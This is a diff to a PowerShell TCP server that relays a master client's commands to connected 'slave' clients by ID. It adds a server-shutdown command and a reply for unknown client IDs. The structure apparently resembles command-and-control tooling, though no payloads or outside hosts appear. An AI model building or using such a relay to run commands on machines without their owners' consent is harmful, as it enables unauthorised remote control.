@@ -127,9 +127,6 @@ while ($exit -eq 0) {
 							
 							$in_buff = $master_reader.ReadLine();
 							$join = $in_buff -join "";
-							#Read commands send by master client, and relay to appropriate endpoint.
-							
-							#Dump connected client info to master client.
 							
 							#client_dump####################################################
 							if ($join -match ".*--client_dump") {
@@ -149,6 +146,18 @@ while ($exit -eq 0) {
 								}
 
 								$master_writer.Flush();
+
+
+							
+							} elseif ($join -match "--server_shutdown") {
+								for ($i=0; $i -lt $ClientList.Length; $i++) {
+									$ClientList[$i].ClientConn.Close();
+								}
+								$MasterClient.ClientConn.Close();
+								$server.Stop();
+								$exit =1;
+
+							#Send slave command##############################################
 							} elseif ($join -match ".*--[i|I][d|D]=([0-9]+)\s+--command=(.*)") {
 								
 								for ($i=0; $i -lt $ClientList.Length; $i++) {
@@ -156,6 +165,13 @@ while ($exit -eq 0) {
 										$client_stream = $ClientList[$i].ClientConn.GetStream();
 										$client_writer = New-Object System.IO.StreamWriter($client_stream)
 										$client_writer.WriteLine($Matches[2]);
+										$client_writer.Flush();
+										break;
+									}
+									if ($Matches[1] -ne $ClientList[$i].ID -and $i -eq $ClientList.Length -1) {
+										$client_stream = $ClientList[$i].ClientConn.GetStream();
+										$client_writer = New-Object System.IO.StreamWriter($client_stream)
+										$client_writer.WriteLine("No client with that ID found");
 										$client_writer.Flush();
 									}
 								}
